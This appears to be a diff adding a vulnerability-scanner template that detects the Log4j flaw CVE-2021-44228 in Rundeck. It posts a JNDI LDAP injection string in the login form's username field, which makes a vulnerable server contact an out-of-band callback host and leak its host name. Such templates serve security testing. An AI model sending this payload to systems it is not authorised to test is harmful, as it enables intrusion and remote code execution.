@@ -1,0 +1,38 @@
+id: rundeck-log4j-rce
+brief:
+    title: Rundeck - Remote Code Execution (Apache Log4j)
+    by: DhiyaneshDK
+    level: critical
+    about: Rundeck is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromis...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - rundeck
+        - kev
+        - oast
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/j_security_check'
+      head:
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{BaseURL}}'
+        Referer: '{{BaseURL}}/user/login'
+      body: j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=admin
+      signs:
+        - "on": word
+          has:
+            - '{{BaseURL}}/user/error'
+          in: location
+          need: all
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
